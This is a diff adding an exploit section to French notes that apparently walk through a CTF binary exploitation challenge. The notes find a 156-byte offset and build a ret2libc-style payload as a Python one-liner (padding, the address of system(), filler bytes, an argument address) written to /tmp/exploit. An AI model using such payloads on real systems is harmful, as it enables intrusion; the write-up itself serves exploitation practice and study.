@@ -20,3 +20,14 @@ run < <(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7
 
 `0x41326641` correspond a la sequence `Af2A`, qui correspond a un offset de 156 characteres.
 
+
+# exploit
+
+on chercher a override eip mais on est dans un process enfant et il y a une protection dans le process parent qui protege contre ca, du coup la gruge c'est de faire un appel a system()
+
+exploit avec padding, shellcode + 4 caracteres dont on se fiche + ;
+
+```python
+python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "BBBB" + "\xf7\xf8\x97\xec"[::-1]' > /tmp/exploit
+```
+
